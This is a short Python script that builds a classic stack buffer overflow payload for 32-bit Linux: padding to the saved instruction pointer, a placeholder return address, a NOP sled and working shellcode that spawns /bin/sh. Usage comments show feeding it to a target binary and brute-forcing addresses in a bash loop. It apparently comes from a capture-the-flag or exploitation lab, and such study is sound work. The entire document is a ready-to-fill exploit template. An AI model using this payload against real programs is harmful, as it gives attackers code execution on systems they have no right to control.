'''
usage: prog.elf $(python /dir2expl/lord.py)
       r $(python /tmp/lord.py)

Change EIP_OFFSET, LUCKY_ADDR, [NOP_SLED]
'''

eip_offset = 0
nop_sled = ("\x90" * 0) # Change 0 to lenght for nopsled (Higher = Better)
lucky_addr = "ADDRESS"  # Linux x86 --> Little Endian (address of nopsled ($esp))

# /bin/sh
shellcode = "\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

exploit = "A" * eip_offset + lucky_addr + nop_sled + shellcode

print(exploit)

'''
Bash usage: for i in {0..100};do door1/file $(python /tmp/lord.py);done
'''